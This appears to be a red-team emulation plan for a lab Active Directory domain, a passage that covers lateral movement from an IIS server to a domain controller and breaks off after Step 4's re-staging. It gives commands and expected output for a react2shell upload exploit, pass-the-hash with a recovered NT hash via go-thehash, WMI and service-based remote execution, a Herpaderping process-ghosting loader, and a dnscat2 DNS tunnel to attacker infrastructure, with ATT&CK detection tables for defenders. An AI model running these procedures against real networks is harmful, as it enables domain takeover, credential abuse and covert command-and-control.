> Lateral Movement, Execution, Command and Control, Persistence

# Phase 3 — Lateral Movement, C2 Establishment & Persistence on Domain Controller

## Overview

With `NT AUTHORITY\SYSTEM` code execution on `react.testlab.local` and the
`TESTLAB\Administrator` NT hash recovered from the Phase 2 LSASS dump, the
attacker performs Pass-the-Hash lateral movement from the IIS server to the
Domain Controller (`DC01`, `10.12.10.10`).

`go-thehash.exe` — a static Go binary pre-staged on IIS01 — authenticates to
DC01 via raw NT hash and transfers the Herpaderping loader and dnscat2 payload
over the `C$` admin share (Steps 1–2). Execution on DC01 is then demonstrated
via **two independent paths** that cover different ATT&CK techniques and produce
different C2 security contexts:

- **Path A — WMI (Step 3):** `go-thehash.exe exec-wmi` invokes `Win32_Process.Create`
  over DCOM. `wmiprvse.exe` impersonates the authenticated caller, so `CertEnrollAgent.exe`
  spawns as `TESTLAB\Administrator` (Domain Admin, High integrity). The Herpaderping
  ghost inherits this token. **No Event ID 7045.**

- **Path B — SCM (Step 4):** `go-thehash.exe exec` creates a transient service via
  MS-SCMR. SCM uses `LocalSystem`, so `CertEnrollAgent.exe` spawns as
  `NT AUTHORITY\SYSTEM` (System integrity). The Herpaderping ghost inherits this token.
  **Event ID 7045 generated permanently.**

Both paths run the same Herpaderping chain on DC01 and establish a dnscat2 C2
session tunnelled through DC01's own DNS conditional forwarder. The two paths can
be run independently or sequentially — if run sequentially, `CertCA.bin` must be
re-uploaded to DC01 before Path B because Herpaderping auto-deletes it during Path A.

With a C2 session on DC01, the attacker stages persistence tooling in Step 5 and then
installs five independent persistence mechanisms (Steps 6–10), each designed to survive
session loss, payload removal, or host reboot. All persistence payloads invoke
`dnscat2.exe` or `dnscat-service.exe` directly — no Herpaderping chain, keeping the
technique scope focused on persistence mechanisms rather than repeating the evasion
chain already demonstrated in Steps 3–4.

- **Step 5** stages `dnscat2.exe`, `dnscat-service.exe`, and service installer tooling on DC01.
- **Step 6 — Domain Backdoor Account:** credential fallback via a covert domain admin
  account (`svcbackup`); survives complete C2 destruction.
- **Step 7 — WMI Permanent Event Subscription:** `wmiprvse.exe` respawns `dnscat2.exe`
  every 60 seconds as `NT AUTHORITY\SYSTEM`; no registry run key or service entry.
- **Step 8 — Network Logon Script:** SYSVOL logon script triggers `dnscat2.exe` on
  every workstation where a domain user logs in; implicit lateral reach without
  additional lateral movement steps.
- **Step 9 — API-Based Windows Service Persistence:** `ServiceInstaller.exe` creates
  an auto-start service through SCM APIs without spawning `sc.exe`.
- **Step 10 — Registry-Backed Windows Service Persistence:** `NtServiceInstaller.exe`
  writes the service configuration directly under `HKLM\SYSTEM\CurrentControlSet\Services`
  using NT APIs; SCM loads the service after reboot or refresh.

---

## Step 1 — Ingress Tool Transfer: Stage Payloads on IIS01

### Voice Track

`C:\ProgramData\CertCA.bin` (dnscat2) was auto-deleted by CWLHerpaderping during
Phase 1 immediately after being read into memory — this is an intentional
anti-forensic behaviour baked into the loader. Before lateral movement can
proceed, the payload and its loader must be re-staged on IIS01 using the same
react2shell eval-based chunked upload path established in Phase 1. No new
exploitation or network exposure is required; the existing `react.testlab.local`
session is sufficient.

`go-thehash.exe` is also staged at this step. It is the only tool that will
touch the network for the remainder of the phase — all subsequent traffic to DC01
originates from `go-thehash.exe` running in the IIS01 SYSTEM shell.

### Procedures

- ☣️ Launch the react2shell interactive session against `react.testlab.local`

  ```bash
  cd resources/payloads/react2shell-tool
  python run_exploit.py -t http://react.testlab.local
  ```

  - ***Expected Output***

    ```text
    [+] Target: http://react.testlab.local
    [+] Connection established!
    ```

- ☣️ Upload and decode dnscat2 payload (re-stage `CertCA.bin` — auto-deleted in Phase 1)

  ```
  rce > upload dnscat2.b64 C:\Windows\Temp\dnscat2.b64
  rce > decode C:\Windows\Temp\dnscat2.b64 C:\ProgramData\CertCA.bin
  ```

  - ***Expected Output***

    ```text
    [*] Uploading dnscat2.b64 via eval (NO spawn - STEALTH!)...
    [+] File uploaded successfully (NO process spawn!)
    [+] File decoded successfully (NO process spawn!)
    ```

- ☣️ Upload and decode CertEnrollAgent (Herpaderping loader) — re-upload if missing from Phase 1

  ```
  rce > upload CertEnrollAgent.b64 C:\Windows\Temp\CertEnrollAgent.b64
  rce > decode C:\Windows\Temp\CertEnrollAgent.b64 C:\ProgramData\CertEnrollAgent.bin
  rce > rename C:\ProgramData\CertEnrollAgent.bin C:\ProgramData\CertEnrollAgent.exe
  ```

  - ***Expected Output***

    ```text
    [+] File uploaded successfully (NO process spawn!)
    [+] File decoded successfully (NO process spawn!)
    ```

- ☣️ Upload and decode `go-thehash.exe` (PtH lateral movement tool)

  ```
  rce > upload go-thehash.b64 C:\Windows\Temp\go-thehash.b64
  rce > decode C:\Windows\Temp\go-thehash.b64 C:\ProgramData\go-thehash.bin
  rce > rename C:\ProgramData\go-thehash.bin C:\ProgramData\go-thehash.exe
  ```

  - ***Expected Output***

    ```text
    [+] File uploaded successfully (NO process spawn!)
    [+] File decoded successfully (NO process spawn!)
    ```

- ☣️ Upload and decode Windows service installer tooling

  ```
  rce > upload ServiceInstaller.b64 C:\Windows\Temp\ServiceInstaller.b64
  rce > decode C:\Windows\Temp\ServiceInstaller.b64 C:\ProgramData\ServiceInstaller.exe
  rce > upload NtServiceInstaller.b64 C:\Windows\Temp\NtServiceInstaller.b64
  rce > decode C:\Windows\Temp\NtServiceInstaller.b64 C:\ProgramData\NtServiceInstaller.exe
  ```

  - ***Expected Output***

    ```text
    [+] File uploaded successfully (NO process spawn!)
    [+] File decoded successfully (NO process spawn!)
    ```

- ☣️ From the IIS01 dnscat2 SYSTEM shell, verify all staged artifacts are present

  ```text
  command (iis-server) 1> shell
  C:\Windows\system32> dir C:\ProgramData\CertCA.bin C:\ProgramData\CertEnrollAgent.exe C:\ProgramData\go-thehash.exe C:\ProgramData\ServiceInstaller.exe C:\ProgramData\NtServiceInstaller.exe
  ```

  - ***Expected Output***

    ```text
    C:\ProgramData\CertCA.bin
    C:\ProgramData\CertEnrollAgent.exe
    C:\ProgramData\go-thehash.exe
    C:\ProgramData\ServiceInstaller.exe
    C:\ProgramData\NtServiceInstaller.exe
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | Sequential POST requests to `react.testlab.local` RSC endpoint appending base64 blocks to `C:\Windows\Temp\dnscat2.b64`, `CertEnrollAgent.b64`, `go-thehash.b64`, `ServiceInstaller.b64`, and `NtServiceInstaller.b64` via eval-based `fs.appendFileSync`; no child process spawned | Not Calibrated - Not Benign | react2shell `upload` re-stages `dnscat2.exe` (as `CertCA.bin`), `CWLHerpaderping.exe` (as `CertEnrollAgent.exe`), `go-thehash.exe`, `ServiceInstaller.exe`, and `NtServiceInstaller.exe` to IIS01 in chunks; identical eval-based chunked path to Phase 1 — already scored in Phase 1 Step 3 (same host, same actor, same mechanism) | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py upload()](../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Windows | POST to RSC endpoint decodes each `.b64` blob to binary via `Buffer.from(..., 'base64')` and `rename` call; no decoder binary or child process | Not Calibrated - Not Benign | react2shell `decode` and `rename` commands convert staged base64 files to executables in-place — identical mechanism to Phase 1 Step 3, already scored | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py decode()](../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -

---

## Step 2 — Lateral Movement: Pass-the-Hash File Transfer to DC01

### Voice Track

`go-thehash.exe` opens an authenticated SMB2 connection to `DC01` using the raw
NT hash for `TESTLAB\Administrator` recovered in Phase 2. Authentication proceeds
via NTLMv2 without involving Windows SSPI or Kerberos: the NT hash is passed
directly to the `spnego.NTLMInitiator` in the `go-smb` library, which constructs
the full NTLM challenge-response exchange over TCP port 445 without touching the
Windows credential store or generating a 4648 logon event on IIS01.

The two payloads are transferred over the `C$` admin share — a share that is
accessible by any member of the `Domain Admins` group. `go-thehash` connects a
fresh SMB session for each `put` operation, and the `go-smb` `PutFile` operation
handles access to `\\DC01\C$` without creating a persistent `net use` mapping.
The resulting files land at `C:\ProgramData\` on DC01: `CertCA.bin` (the dnscat2
payload, read and deleted by the loader) and `CertEnrollAgent.exe` (the Herpaderping
loader, executed in Step 3).

The NT hash does not appear in any Windows event log on IIS01. On DC01, Event
ID 4624 (Logon Type 3, NTLM, `LogonProcessName: NtLmSsp`) is generated for the
`TESTLAB\Administrator` account from source IP `10.12.10.20` (IIS01). This is the
first lateral movement artefact and the primary detection signal for T1550.002.

### Procedures

- ☣️ From the IIS01 dnscat2 SYSTEM shell, transfer dnscat2 payload to DC01

  ```text
  C:\ProgramData> go-thehash.exe put 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\CertCA.bin C:\ProgramData\CertCA.bin
  ```

  - ***Expected Output***

    ```text
    [+] Authenticated as TESTLAB\Administrator
    [+] Uploaded 3350528 bytes → \\C$\C$\ProgramData\CertCA.bin
    ```

- ☣️ Transfer Herpaderping loader to DC01

  ```text
  C:\ProgramData> go-thehash.exe put 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\CertEnrollAgent.exe C:\ProgramData\CertEnrollAgent.exe
  ```

  - ***Expected Output***

    ```text
    [+] Authenticated as TESTLAB\Administrator
    [+] Uploaded <size> bytes → \\C$\C$\ProgramData\CertEnrollAgent.exe
    ```

- ☣️ Verify both files landed on DC01 (optional)

  ```text
  C:\ProgramData> go-thehash.exe exec-wmi 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a "cmd.exe /c dir C:\ProgramData\CertCA.bin C:\ProgramData\CertEnrollAgent.exe > C:\Windows\Temp\ls.txt"
  C:\ProgramData> go-thehash.exe get 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ Windows\Temp\ls.txt .\ls.txt
  C:\ProgramData> type .\ls.txt
  ```

  - ***Expected Output***

    ```text
    [*] WMI exec as TESTLAB\Administrator → 10.12.10.10
    [+] Process created, PID = <pid>
    [+] ReturnValue = 0
    [+] Authenticated as TESTLAB\Administrator
    [+] Downloaded <size> bytes → .\ls.txt
    ```

    ```text
     Directory of C:\ProgramData

    <date>  <time>    3,350,528 CertCA.bin
    <date>  <time>      <size> CertEnrollAgent.exe
                   2 File(s)    <size> bytes
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Lateral Movement | T1550.002 | Use Alternate Authentication Material: Pass the Hash | Windows | `go-thehash.exe` authenticates as `TESTLAB\Administrator` to DC01 over NTLM, generating Event ID 4624 (Logon Type 3, `LogonProcessName: NtLmSsp`) on DC01 from source IP `10.12.10.20` | Calibrated - Not Benign | `go-thehash.exe` authenticates to DC01 via raw NT hash (`41c46bf74ec071f65c7b97df4b7d672a`) passed directly to `spnego.NTLMInitiator`; NTLMv2 challenge-response built in Go without touching Windows SSPI or credential store | react.testlab.local → DC01 | TESTLAB\Administrator | [main.go connect()](../resources/payloads/go-thehash/main.go) | -
| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | `go-thehash.exe` accesses the `\\DC01\C$` admin share from IIS01 over SMB2 using `TESTLAB\Administrator` | Calibrated - Not Benign | `go-thehash.exe put` uses an authenticated SMB2 session to reach the `C$` admin share on DC01 with the recovered domain admin hash | react.testlab.local → DC01 | TESTLAB\Administrator | [main.go putFile()](../resources/payloads/go-thehash/main.go) | -
| Lateral Movement | T1570 | Lateral Tool Transfer | Windows | `go-thehash.exe` stages `CertCA.bin` and `CertEnrollAgent.exe` at `C:\ProgramData\` on DC01 for later execution | Calibrated - Not Benign | `go-thehash.exe put` moves the dnscat2 payload (`CertCA.bin`) and Herpaderping loader (`CertEnrollAgent.exe`) from compromised IIS01 to DC01; this staging outcome is distinct from the SMB admin-share transport captured by T1021.002 | react.testlab.local → DC01 | TESTLAB\Administrator | [main.go putFile()](../resources/payloads/go-thehash/main.go) | -

---

## Step 3 — Path A: WMI Execution & C2 as Domain Admin (T1047)

### Voice Track

`go-thehash.exe exec-wmi` initiates a DCOM connection to DC01 on port 135 (the
DCOM endpoint mapper), exchanges NTLM authentication using the same NT hash as
Step 2, then resolves a dynamic high port for the WMI interface (`IWbemServices`).
The client logs into the `//./root/cimv2` namespace and invokes
`Win32_Process.Create(CommandLine="C:\ProgramData\CertEnrollAgent.exe")`.

`wmiprvse.exe` receives the request and **impersonates the authenticated caller**
(`TESTLAB\Administrator`) for the duration of the method call — standard DCOM
impersonation behaviour when `RpcAuthnLevelPktPrivacy` is negotiated. The new
process is therefore created under the impersonated `TESTLAB\Administrator` token,
not the `wmiprvse.exe` host SYSTEM token. `CertEnrollAgent.exe` starts at High
Mandatory Level with full domain administrator group membership and privilege set
(`SeDebugPrivilege`, `SeBackupPrivilege`, `SeImpersonatePrivilege`, etc.). No
Event ID 7045 is written and no service registry key is created.

`CertEnrollAgent.exe` reads `CertCA.bin` from `C:\ProgramData\`, deletes it, and
runs the Herpaderping sequence: writes the payload to a temp file (`HD*.tmp`),
maps a `NtCreateSection(SEC_IMAGE)` section, and calls `NtCreateProcessEx` with a
handle to a Session 0 `svchost.exe` or fallback `wininit.exe` for PPID spoofing
and Session 0/job-object avoidance. Because `NtCreateProcessEx` is called with the
spoofed parent handle, the ghost initially inherits the spoofed parent's token.
`CertEnrollAgent.exe` then opens its own process token, duplicates it as a primary
token, and assigns it to the ghost via `NtSetInformationProcess(ProcessAccessToken)`.
The resulting C2 session runs as `TESTLAB\Administrator` with domain admin
privileges — **not SYSTEM**. This privilege level persists for all subsequent
commands issued through this dnscat2 session.

### Procedures

- ☣️ From the IIS01 dnscat2 SYSTEM shell, trigger WMI execution of CertEnrollAgent on DC01

  ```text
  C:\ProgramData> go-thehash.exe exec-wmi 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a "C:\ProgramData\CertEnrollAgent.exe"
  ```

  - ***Expected Output***

    ```text
    [*] WMI exec as TESTLAB\Administrator → 10.12.10.10
    [+] Process created, PID = <pid>
    [+] ReturnValue = 0
    ```

- ☣️ On the attacker machine, confirm the new C2 session from DC01

  ```text
  dnscat2> New session established: <session-id>
  dnscat2> session -i <session-id>
  command (dc01) 2> whoami
  command (dc01) 2> whoami /groups
  command (dc01) 2> shell
  C:\Windows\system32> hostname
  ```

  - ***Expected Output***

    ```text
    testlab\administrator

    GROUP INFORMATION
    -----------------

    Group Name                                     Type             SID                                           Attributes
    ============================================== ================ ============================================= ===============================================================
    Everyone                                       Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
    BUILTIN\Administrators                         Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
    BUILTIN\Users                                  Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
    BUILTIN\Pre-Windows 2000 Compatible Access     Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\NETWORK                           Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\Authenticated Users               Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\This Organization                 Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
    TESTLAB\Group Policy Creator Owners            Group            S-1-5-21-...-520                              Mandatory group, Enabled by default, Enabled group
    TESTLAB\Domain Admins                          Group            S-1-5-21-...-512                              Mandatory group, Enabled by default, Enabled group
    TESTLAB\Enterprise Admins                      Group            S-1-5-21-...-519                              Mandatory group, Enabled by default, Enabled group
    TESTLAB\Schema Admins                          Group            S-1-5-21-...-518                              Mandatory group, Enabled by default, Enabled group
    TESTLAB\Denied RODC Password Replication Group Alias            S-1-5-21-...-572                              Mandatory group, Enabled by default, Enabled group, Local Group
    NT AUTHORITY\NTLM Authentication               Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
    Mandatory Label\High Mandatory Level           Label            S-1-16-12288

    DC01
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Lateral Movement | T1550.002 | Use Alternate Authentication Material: Pass the Hash | Windows | Event ID 4624 on DC01: Logon Type 3, NTLM, `LogonProcessName: NtLmSsp`, source IP `10.12.10.20`; DCOM-initiated logon on port 135 then ephemeral RPC port | Not Calibrated - Not Benign | `go-thehash.exe exec-wmi` authenticates the DCOM session to DC01 via NT hash passed to `spnego.NTLMInitiator` inside `msdcom.DCOMOptions.MechFactory` — same Event ID 4624 Logon Type 3 NTLM pattern already scored in Step 2; implementation detail of T1047 | react.testlab.local | TESTLAB\Administrator | [main.go execViaWMI()](../resources/payloads/go-thehash/main.go) | -
| Privilege Escalation | T1078.002 | Valid Accounts: Domain Accounts | Windows | Event ID 4624 on DC01: Logon Type 3, `TESTLAB\Administrator`, source IP `10.12.10.20` (IIS01); domain admin identity established for DCOM WMI session — account logs on to DC01 without interactive session or prior TGT on IIS01 | Not Calibrated - Not Benign | `go-thehash.exe exec-wmi` authenticates to DC01 using the `TESTLAB\Administrator` NT hash; the DCOM session runs under this domain admin account — same Event ID 4624 identity signal already scored in Step 2; implementation detail of T1047 | DC01 | TESTLAB\Administrator | [main.go execViaWMI()](../resources/payloads/go-thehash/main.go) | -
| Execution | T1047 | Windows Management Instrumentation | Windows | `wmiprvse.exe` spawns `CertEnrollAgent.exe` on DC01 via a remote WMI `Win32_Process.Create` call originating from IIS01 | Calibrated - Not Benign | `go-thehash.exe exec-wmi` calls `Win32_Process.Create(CommandLine="C:\ProgramData\CertEnrollAgent.exe")` via `IWbemServices::ExecMethod`; `wmiprvse.exe` impersonates `TESTLAB\Administrator` (DCOM impersonation) so the spawned process inherits domain admin token | DC01 | TESTLAB\Administrator | [main.go execViaWMI()](../resources/payloads/go-thehash/main.go) | -
| Execution | T1106 | Native API | Windows | `NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx` resolved via `GetProcAddress` from `ntdll.dll`; all five stack-spoofed with fake return address inside `kernel32.dll` | Not Calibrated - Not Benign | `CertEnrollAgent.exe` (running as `TESTLAB\Administrator` on DC01) calls NT native APIs to create the ghost process; identical Herpaderping chain to Phase 1 Step 3 (same binary, same technique) but different host and token context | DC01 | TESTLAB\Administrator | [CWLImplant.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1055 | Process Injection | Windows | `CertEnrollAgent.exe` maps a `SEC_IMAGE` section from a temporary file and spawns a ghost process via `NtCreateProcessEx` before overwriting the temp file on disk | Not Calibrated - Not Benign | CWLHerpaderping writes dnscat2 to temp file, maps `SEC_IMAGE` section, spawns ghost via `NtCreateProcessEx`, overwrites temp file with `Hello From CyberWarFare Labs` junk — identical binary and behavior to Phase 1 Step 3; different host (DC01 vs react.testlab.local) and token context (domain admin vs SYSTEM) but same detection capability; already scored in Phase 1 Step 3 | DC01 | TESTLAB\Administrator | [CWLImplant.cpp Herpaderping()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1134.004 | Access Token Manipulation: Parent PID Spoofing | Windows | `CertEnrollAgent.exe` assigns Session 0 `svchost.exe` or `wininit.exe` as the parent of the ghost process via `NtCreateProcessEx` | Not Calibrated - Not Benign | `GetNonJobParent()` enumerates processes, filters to Session 0 via `ProcessIdToSessionId`, opens the first accessible `svchost.exe` or fallback `wininit.exe` for PPID spoofing and Session 0/job-object avoidance; the ghost initially inherits the spoofed parent's token, then `NtSetInformationProcess(ProcessAccessToken)` assigns a duplicate of `CertEnrollAgent.exe`'s `TESTLAB\Administrator` token — identical binary and mechanism to Phase 1 Step 3; different token context (domain admin vs SYSTEM) but same detection capability; already scored in Phase 1 Step 3 | DC01 | TESTLAB\Administrator | [CWLImplant.cpp GetNonJobParent()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1070.004 | Indicator Removal: File Deletion | Windows | `CertEnrollAgent.exe` deletes `C:\ProgramData\CertCA.bin` via `DeleteFileW` immediately after reading it into memory | Not Calibrated - Not Benign | `DeleteFileW(PAYLOAD_PATH)` called inside `GetPayloadBuffer()` immediately after `ReadFile` — payload file removed before ghost process starts; identical binary and behavior to Phase 1 Step 3; same detection capability despite different host; already scored in Phase 1 Step 3 | DC01 | TESTLAB\Administrator | [CWLImplant.cpp GetPayloadBuffer()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | `CertEnrollAgent.exe` spoofs the ghost process PEB `ProcessParameters` to show `C:\Windows\System32\RuntimeBroker.exe` | Not Calibrated - Not Benign | `RtlCreateProcessParametersEx` builds fake process parameters with `RuntimeBroker.exe` as the image path and `WriteProcessMemory` patches the ghost PEB pointer; the kernel `ImageFileName` is not directly modified — identical binary and behavior to Phase 1 Step 3; same detection capability despite different host; already scored in Phase 1 Step 3 | DC01 | TESTLAB\Administrator | [CWLImplant.cpp Herpaderping()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Discovery | T1012 | Query Registry | Windows | `RuntimeBroker.exe` (ghost process) reads the `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\NameServer` registry key | Not Calibrated - Not Benign | dnscat2 `getSystemDNS()` performs a two-pass registry scan, selecting static `NameServer` values before `DhcpNameServer`; in this lab DC01 resolves to `127.0.0.1` and forwards queries through the conditional forwarder to attacker infrastructure; identical registry access to Phase 1 Step 3 | DC01 | TESTLAB\Administrator | [getdns_windows.go collectDNSServers()](../resources/payloads/dnscat2/go-client/cmd/dnscat/getdns_windows.go) | -
| Defense Evasion | T1564.003 | Hide Artifacts: Hidden Window | Windows | Ghost process on DC01 has no console window; `CertEnrollAgent.exe` spawned by `wmiprvse.exe` via `Win32_Process.Create` starts in Session 0 with no interactive window; dnscat2 compiled with `-H windowsgui` | Not Calibrated - Not Benign | `Win32_Process.Create` starts `CertEnrollAgent.exe` in Session 0 without a visible window; dnscat2 compiled with `-H windowsgui` suppresses console window — no visible window artifact on DC01 at any point during or after the Herpaderping chain; identical to Phase 1 Step 3 | DC01 | TESTLAB\Administrator | [dnscat2 build flags](../resources/payloads/dnscat2/go-client) | -
| Defense Evasion | T1564.010 | Hide Artifacts: Process Argument Spoofing | Windows | `CertEnrollAgent.exe` patches the remote PEB `ProcessParameters` pointer of the ghost process to a spoofed structure | Not Calibrated - Not Benign | `CWLHerpaderping` on DC01 (running as `TESTLAB\Administrator`) builds fake `RTL_USER_PROCESS_PARAMETERS` with `RuntimeBroker.exe` image path; `WriteProcessMemory` patches the ghost PEB pointer — dnscat2 C2 session appears as `RuntimeBroker.exe` running as `TESTLAB\Administrator`; identical binary and behavior to Phase 1 Step 3; same detection capability despite different host/token; already scored in Phase 1 Step 3 | DC01 | TESTLAB\Administrator | [CWLImplant.cpp Herpaderping()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Command and Control | T1071.004 | Application Layer Protocol: DNS | Windows | `RuntimeBroker.exe` (ghost process) issues a high volume of DNS queries containing encoded subdomain labels (`<hex>.<session>.attacker.local`) to the resolver selected from the Windows TCP/IP interface registry (`127.0.0.1` on DC01 in this lab) | Not Calibrated - Not Benign | dnscat2 C2 session from DC01 as `TESTLAB\Administrator` with domain admin privileges; `getSystemDNS()` selects the local resolver from the interface `NameServer` value and queries route through DC01's conditional forwarder for `attacker.local` — identical binary (dnscat2.exe) and DNS tunneling behavior to Phase 1 Step 3; different host (DC01 vs react.testlab.local) and token context (domain admin vs SYSTEM) but same detection capability; already scored in Phase 1 Step 3 | DC01 | TESTLAB\Administrator | [dnscat2.exe](../resources/payloads/dnscat2/go-client/dnscat2.exe) | -
| Command and Control | T1573.002 | Encrypted Channel: Asymmetric Cryptography | Windows | DNS payloads encrypted with session keys derived from ECDH P-256 key exchange; pre-shared secret `c7517dee4fcbe16a0c8c1f98cdc5ce4e` used for HMAC authenticator verification; opaque to DNS content inspection | Not Calibrated - Not Benign | dnscat2 performs ECDH P-256 key exchange then encrypts C2 traffic with Salsa20 stream cipher; pre-shared secret used for authenticator verification — identical encryption mechanism to Phase 1 Step 3 | DC01 | TESTLAB\Administrator | [dnscat2.exe](../resources/payloads/dnscat2/go-client/dnscat2.exe) | -
| Defense Evasion | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | `CertEnrollAgent.exe` (CWLHerpaderping) resolves `NtCreateSection`, `NtCreateProcessEx`, `NtQueryInformationProcess`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`, `NtSetInformationProcess`, and `RtlCreateProcessParametersEx` via `GetProcAddress` from `ntdll.dll` at runtime; these APIs do not appear as static imports | Not Calibrated - Not Benign | CWLHerpaderping calls `GetProcAddress` to resolve injection, PEB spoofing, and token-fixup APIs at runtime rather than importing them statically — reducing visibility to static import analysis; identical to Phase 1 Step 3 | DC01 | TESTLAB\Administrator | [CWLImplant.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1027.008 | Obfuscated Files or Information: Stripped Payloads | Windows | `dnscat2.exe` is built with Go `-s -w -H windowsgui`, removing Go symbol/debug metadata and suppressing a console window | Not Calibrated - Not Benign | The dnscat2 Go payload is compiled with `-s -w -H windowsgui`; `CertEnrollAgent.exe` is a separate C++ Release build, so the Go stripping flags apply only to the dnscat2 payload; identical to Phase 1 Step 3 | DC01 | TESTLAB\Administrator | [dnscat2.exe](../resources/payloads/dnscat2.exe), [dnscat2 BUILD.md](../resources/payloads/dnscat2/go-client/BUILD.md) | -
| Defense Evasion | T1134 | Access Token Manipulation | Windows | `CertEnrollAgent.exe` calls `NtSetInformationProcess` with class `ProcessAccessToken` on the ghost process handle, assigning a duplicate of its own `TESTLAB\Administrator` primary token | Not Calibrated - Not Benign | After ghost process creation via `NtCreateProcessEx`, `CertEnrollAgent.exe` duplicates its own primary token and assigns it to the ghost via `NtSetInformationProcess(ProcessAccessToken)` — overriding the inherited spoofed parent token with `TESTLAB\Administrator` domain admin token, **not SYSTEM**; identical mechanism to Phase 1 Step 3 but different token context | DC01 | TESTLAB\Administrator | [CWLImplant.cpp Herpaderping()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -

---

## Step 4 — Path B: SCM Execution & C2 as SYSTEM (T1569.002)

> **Prerequisite:** `CertCA.bin` was auto-deleted by Herpaderping during Step 3.
> Re-upload it to DC01 before proceeding. `CertEnrollAgent.exe` remains on disk.

### Procedures (re-stage CertCA.bin)

- ☣️ From the IIS01 dnscat2 SYSTEM shell, re-upload `CertCA.bin` to DC01

  ```text
  C:\ProgramData> go-thehash.exe put 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\CertCA.bin C:\ProgramData\CertCA.bin
  ```

  - ***Expected Output***

    ```text
    [+] Authenticated as TESTLAB\Administrator
    [+] Uploaded 3350528 bytes → \\C$\C$\ProgramData\CertCA.bin
    ```

### Reference Tables

> When Step 4 is run independently (without Step 2 having already executed), this
> re-stage produces its own T1550.002 and T1021.002 artifacts on DC01 — separately
> scoreable from the Step 2 transfer.

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Lateral Movement | T1550.002 | Use Alternate Authentication Material: Pass the Hash | Windows | Event ID 4624 on DC01: Logon Type 3, NTLM, `LogonProcessName: NtLmSsp`, source IP `10.12.10.20` (IIS01); SMB2 C$ tree connect | Not Calibrated - Not Benign | `go-thehash.exe put` authenticates to DC01 via NT hash to open a C$ tree for re-staging `CertCA.bin` — same SMB C$ auth pattern already scored in Step 2 | react.testlab.local | TESTLAB\Administrator | [main.go connect()](../resources/payloads/go-thehash/main.go) | -
| Privilege Escalation | T1078.002 | Valid Accounts: Domain Accounts | Windows | Event ID 4624 on DC01: Logon Type 3, `TESTLAB\Administrator`, source IP `10.12.10.20` (IIS01); C$ share access under domain admin account during re-stage — account active on DC01 without prior interactive session | Not Calibrated - Not Benign | `go-thehash.exe put` authenticates to DC01 using the `TESTLAB\Administrator` NT hash; C$ session for `CertCA.bin` re-staging runs under domain admin identity — same Event ID 4624 identity signal already scored in Step 2 | react.testlab.local | TESTLAB\Administrator | [main.go connect()](../resources/payloads/go-thehash/main.go) | -
| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | SMB2 `TreeConnect` to `\\DC01\C$`; `Create` and `Write` requests for `ProgramData\CertCA.bin`; file appears in `C:\ProgramData\` on DC01 | Not Calibrated - Not Benign | `go-thehash.exe put` writes `CertCA.bin` to `C:\ProgramData\` on DC01 via the `C$` admin share — same C$ TreeConnect pattern already scored in Step 2 | react.testlab.local | TESTLAB\Administrator | [main.go putFile()](../resources/payloads/go-thehash/main.go) | -
